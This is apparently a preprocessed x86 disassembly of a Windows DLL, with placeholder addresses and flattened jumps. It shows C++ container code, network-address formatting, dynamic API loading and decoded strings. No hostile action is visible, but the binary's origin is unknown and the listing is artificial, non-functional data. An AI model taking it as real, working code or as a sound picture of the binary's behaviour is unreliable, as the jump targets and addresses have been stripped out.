lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
xor eax eax
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
lea ecx [ ebp - 0x40 ]
call sub_100019e0
mov [ ebp - 0x4 ] 0x9
lea eax [ ebp - 0x40 ]
mov esi [ ebp - 0x54 ]
cmp eax esi
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x28 ]
call sub_100019e0
mov [ ebp - 0x4 ] 0xe
lea eax [ ebp - 0x28 ]
mov esi [ ebp - 0x48 ]
cmp eax esi
jae r-xdata
cmp esi [ ebp - 0x50 ]
jne r-xdata
mov edi [ ebp - 0x58 ]
cmp edi eax
ja r-xdata
cmp esi [ ebp - 0x44 ]
jne r-xdata
mov edi [ ebp - 0x4c ]
cmp edi eax
ja r-xdata
mov [ ebp - 0xe0 ] esi
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0x4 ] 0xc
test esi esi
je r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_1002d450
mov esi [ ebp - 0x54 ]
mov ecx eax
mov eax 0x2aaaaaab
sub ecx edi
imul ecx
sar edx 0x2
mov ebx edx
shr ebx 0x1f
add ebx edx
cmp esi [ ebp - 0x50 ]
jne r-xdata
mov [ ebp - 0xe0 ] esi
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0x4 ] 0x11
test esi esi
je r-xdata
push ecx
lea ecx [ ebp - 0x4c ]
call sub_1002d450
mov esi [ ebp - 0x48 ]
mov ecx eax
mov eax 0x2aaaaaab
sub ecx edi
imul ecx
sar edx 0x2
mov ebx edx
shr ebx 0x1f
add ebx edx
cmp esi [ ebp - 0x44 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x9
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x2c ] 0x10
jae r-xdata
lea eax [ ebx + ebx * 2 ]
mov [ ebp - 0xd0 ] esi
lea edi [ edi + eax * 8 ]
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0x4 ] 0xa
test esi esi
je r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_1002d450
mov esi [ ebp - 0x54 ]
mov edi [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0xe
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x14 ] 0x10
jae r-xdata
lea eax [ ebx + ebx * 2 ]
mov [ ebp - 0xe0 ] esi
lea edi [ edi + eax * 8 ]
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0x4 ] 0xf
test esi esi
je r-xdata
push ecx
lea ecx [ ebp - 0x4c ]
call sub_1002d450
mov esi [ ebp - 0x48 ]
mov edi [ ebp - 0x4c ]
mov eax [ ebp - 0xf4 ]
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0x4 ] 0xd
mov eax [ ebp - 0x40 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x30 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0x9
mov ebx [ ebp - 0xc4 ]
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ ebp - 0xf4 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0x4 ] 0x12
mov eax [ ebp - 0x28 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x11
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x18 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0xe
mov ebx [ ebp - 0xc4 ]
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ ebp - 0x30 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
push eax
lea eax [ ebp - 0x40 ]
push eax
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
add [ ebp - 0x54 ] 0x18
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0xe0 ] esi
mov [ ebp - 0x4 ] 0xb
mov eax [ edi ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xa
mov [ edi ] 0x0
mov eax [ edi + 0x10 ]
inc eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
add [ ebp - 0x48 ] 0x18
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0x4 ] 0x10
mov eax [ edi ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xf
mov [ edi ] 0x0
mov eax [ edi + 0x10 ]
inc eax
je r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
push eax
push edi
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
push eax
push edi
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
sub_1002c930
push ebp
mov ebp esp
push 0xffffffff
push sub_10051582
mov eax [ fs : 0x0 ]
push eax
sub esp 0x534
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x52c ] ebx
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x540 ] ebx
mov [ ebp - 0x528 ] edi
mov [ ebp - 0x524 ] 0x0
cmp eax 0x1c
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] 0x0
cmp [ rw-data ] 0x0
mov edx [ edi + 0x4 ]
mov [ ebp - 0x52c ] edx
jne r-xdata
mov eax [ rw-data ]
mov esi [ htons@IAT ]
mov [ ebp - 0x53c ] eax
movzx eax [ edi + 0x16 ]
push eax
call esi
movzx eax ax
mov [ ebp - 0x538 ] eax
movzx eax [ edi + 0x14 ]
push eax
call esi
movzx eax ax
mov [ ebp - 0x534 ] eax
movzx eax [ edi + 0x12 ]
push eax
call esi
movzx eax ax
mov [ ebp - 0x530 ] eax
movzx eax [ edi + 0x10 ]
push eax
call esi
movzx ebx ax
movzx eax [ edi + 0xe ]
push eax
call esi
movzx edi ax
mov eax [ ebp - 0x528 ]
movzx eax [ eax + 0xc ]
push eax
call esi
movzx esi ax
mov eax [ ebp - 0x528 ]
movzx eax [ eax + 0xa ]
push eax
call [ htons@IAT ]
movzx ecx ax
mov eax [ ebp - 0x528 ]
movzx edx [ eax + 0x8 ]
mov eax [ ebp - 0x538 ]
movzx eax ax
push eax
mov eax [ ebp - 0x534 ]
movzx eax ax
push eax
mov eax [ ebp - 0x530 ]
movzx eax ax
push eax
push ebx
push edi
push esi
push ecx
push edx
call [ htons@IAT ]
movzx eax ax
push eax
push [ ebp - 0x53c ]
lea eax [ ebp - 0x520 ]
push eax
call sub_1002d790
mov esi [ ebp - 0x52c ]
add esp 0x28
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x520 ] 0x0
jne r-xdata
lea ecx [ eax + 0x61 ]
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx [ rw-data ]
mov eax edx
shr eax 0x18
push eax
mov eax edx
shr eax 0x10
and eax 0xff
push eax
mov eax edx
shr eax 0x8
and eax 0xff
push eax
movzx eax dl
push eax
push ecx
lea eax [ ebp - 0x520 ]
push eax
call sub_1002d790
add esp 0x18
lea eax [ ebp - 0x520 ]
mov ecx ebx
push eax
call sub_10001820
jmp r-xdata
lea ecx [ eax + 0x6e ]
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov edx [ ebp - 0x52c ]
lea eax [ ebp - 0x520 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x524 ] 0x1
mov eax ebx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x520 ]
mov ecx esi
push eax
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x524 ] 0x1
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
sub_1002cb90
push ebp
mov ebp esp
push 0xffffffff
push sub_10051631
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov ebx ecx
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xcc ] 0x0
mov [ ebp - 0xc8 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx 0x7b
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xcc ] 0x0
mov [ ebp - 0xc8 ] 0x0
push ecx
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x1000
mov [ ebp - 0xd4 ] 0x1000
call sub_1003c61a
add esp 0x4
mov [ ebp - 0xc4 ] eax
lea ecx [ ebp - 0xd4 ]
mov edi eax
push ecx
push eax
push 0x0
push 0x80
push 0x0
call esi
cmp eax 0x6f
jne r-xdata
test eax eax
jne r-xdata
push edi
call j_sub_1003f3e3
push [ ebp - 0xd4 ]
call sub_1003c61a
add esp 0x8
mov [ ebp - 0xc4 ] eax
lea ecx [ ebp - 0xd4 ]
mov edi eax
push ecx
push eax
push 0x0
push 0x80
push 0x0
call esi
push [ ebp - 0xc4 ]
call j_sub_1003f3e3
mov ecx [ ebp - 0xcc ]
add esp 0x4
mov eax [ ebp - 0xd0 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ ebp - 0xc8 ]
mov [ ebx ] eax
mov [ ebx + 0x8 ] ecx
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xcc ] 0x0
mov [ ebp - 0xc8 ] 0x0
jmp r-xdata
cmp [ ebp - 0xc4 ] eax
je r-xdata
mov [ ebp - 0xd8 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
jmp r-xdata
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x0
mov [ ebp - 0x64 ] 0x7
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] ax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x58 ] al
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0x7
mov edx [ edi + 0xc ]
cmp [ edx ] al
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
lea ecx [ ebp - 0x90 ]
call sub_100019e0
mov edx [ edi + 0x24 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
push edx
lea ecx [ ebp - 0x78 ]
call sub_10009730
push [ edi + 0x34 ]
lea eax [ edi + 0x2c ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x28 ]
push eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
sub ecx esi
sar ecx 0x1
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x44 ] 0xf
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
call sub_10005010
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi + 0x38 ]
and eax 0x4
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x60 ] eax
mov eax [ edi + 0x40 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
cmp eax 0x47
je r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax 0x1
cmp eax 0x6
je r-xdata
cmp [ edi ] 0x170
jb r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0xd0 ]
call sub_1002d390
mov edi [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x90 ]
call sub_10014980
test edi edi
jne r-xdata
mov esi [ edi + 0xa4 ]
test esi esi
je r-xdata
push [ esi + 0x10 ]
lea ecx [ ebp - 0xa8 ]
push [ esi + 0xc ]
call sub_1002c930
add esp 0x8
mov [ ebp - 0x4 ] 0x9
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_1002d230
mov esi [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x94 ] 0x10
jb r-xdata
mov [ ebp - 0x5c ] eax
mov esi [ edi + 0x10 ]
test esi esi
je r-xdata
jmp r-xdata
mov [ ebp - 0x94 ] 0xf
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0xa8 ] 0x0
test esi esi
jne r-xdata
push [ ebp - 0xa8 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ esi + 0x10 ]
lea ecx [ ebp - 0xc0 ]
push [ esi + 0xc ]
call sub_1002c930
add esp 0x8
mov [ ebp - 0x4 ] 0xa
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_1002d230
mov esi [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xac ] 0x10
jb r-xdata
mov [ ebp - 0xac ] 0xf
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xc0 ] 0x0
test esi esi
jne r-xdata
push [ ebp - 0xc0 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002d010
push ebp
mov ebp esp
push 0xffffffff
push sub_100516a3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14c ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x150 ] edi
mov [ ebp - 0x130 ] r--data
jne r-xdata
mov eax [ rw-data ]
push eax
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x12c ] eax
mov [ ebp - 0x4 ] 0x1
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
push 0x114
lea eax [ ebp - 0x128 ]
mov [ ebp - 0x14c ] 0x1
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0x128 ] 0x114
lea eax [ ebp - 0x128 ]
push eax
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x124 ] 0x5
jbe r-xdata
mov ecx 0x1a
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx [ edi + 0x4 ]
mov eax 0x4ec4ec4f
sub ecx [ edi ]
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x13c ]
call sub_1002cb90
mov [ ebp - 0x4 ] 0x2
mov ecx edi
push eax
call sub_1002d310
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x13c ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x12c ]
mov [ ebp - 0x130 ] r--data
test eax eax
je r-xdata
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x148 ]
call sub_1002c150
mov [ ebp - 0x4 ] 0x3
mov ecx edi
push eax
call sub_1002d310
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x148 ]
test esi esi
je r-xdata
mov ebx [ ebp - 0x138 ]
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push eax
call [ FreeLibrary@IAT ]
mov ebx [ ebp - 0x144 ]
cmp esi ebx
je r-xdata
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x138 ] 0x0
mov [ ebp - 0x134 ] 0x0
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi ebx
jne r-xdata
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x148 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov [ ebp - 0x140 ] 0x0
lea ebx [ ebx ]
mov esi [ ebp - 0x13c ]
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi ebx
jne r-xdata
mov esi [ ebp - 0x148 ]
sub_1002d230
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e042
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_1002d450
sub edi eax
mov eax 0x2aaaaaab
imul edi
sar edx 0x2
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] 0x18
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push 0x0
push edi
mov eax [ esi ]
lea ecx [ edi + edi * 2 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_1002d450
push 0xffffffff
push 0x0
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
call sub_100018b0
sub_1002d310
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi ebx
je r-xdata
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
pop esi
mov eax [ edi + 0x4 ]
cmp esi eax
je r-xdata
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov ebx eax
nop
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
sub_1002d390
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e042
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_1002d4f0
sub edi eax
mov eax 0x4ec4ec4f
imul edi
sar edx 0x5
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] 0x68
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
mov ecx [ esi + 0x4 ]
imul eax edi 0x68
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
add eax [ esi ]
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_1002d4f0
push eax
jmp r-xdata
call sub_1002d810
sub_1002d450
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x2aaaaaab
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x2aaaaaab
imul esi
push ebx
sar edx 0x2
mov ebx 0xaaaaaaa
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x2aaaaaab
imul edi
inc esi
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_1002d590
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_1002d590
pop edi
pop esi
retn 0x4
sub_1002d4f0
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x4ec4ec4f
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x4ec4ec4f
imul esi
push ebx
sar edx 0x5
mov ebx 0x2762762
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x4ec4ec4f
imul edi
inc esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_1002d690
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_1002d690
pop edi
pop esi
retn 0x4
sub_1002d590
push ebp
mov ebp esp
push 0xffffffff
push sub_100516d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_1002d8f0
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp + 0x8 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp edi 0xaaaaaaa
ja r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x8 ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push eax
call sub_10004c10
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp + 0x8 ]
call sub_1003c58d
lea eax [ edi + edi * 2 ]
shl eax 0x3
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_1002d690
push ebp
mov ebp esp
push 0xffffffff
push sub_100516f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push edi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_1002d990
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov ecx eax
sub ecx esi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
cmp eax 0x2762762
ja r-xdata
imul eax [ ebp + 0x8 ] 0x68
add eax edi
mov [ ebx + 0x8 ] eax
imul eax [ ebp - 0x18 ] 0x68
add eax edi
mov [ ebx + 0x4 ] eax
mov [ ebx ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ ebp - 0x14 ]
